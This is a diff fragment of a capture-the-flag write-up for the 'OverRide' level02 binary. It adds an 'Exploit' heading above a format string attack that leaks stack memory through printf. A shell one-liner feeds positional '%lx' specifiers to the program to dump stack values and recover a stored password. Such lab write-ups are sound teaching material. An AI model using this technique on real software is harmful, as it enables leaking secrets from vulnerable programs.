@@ -39,6 +39,7 @@ Here `printf()` is ussed is such way that input string is evaluated as a command
 
 As password is stored in the buffer and FSA can be performed, read the stack using long conversion specifier `%lx` (as binary is an 64-bytes).
 
+## Exploit
 Let's read first 32 values on the stack, one at time, printing only hexadecimal values
 ```shell
 level02@OverRide:~$ for i in {0..32}; do python -c "print('%$i\$016lx')" | ./level02 | grep -oE '[a-f0-9]{16}' | tr '\n' ' '; done; echo
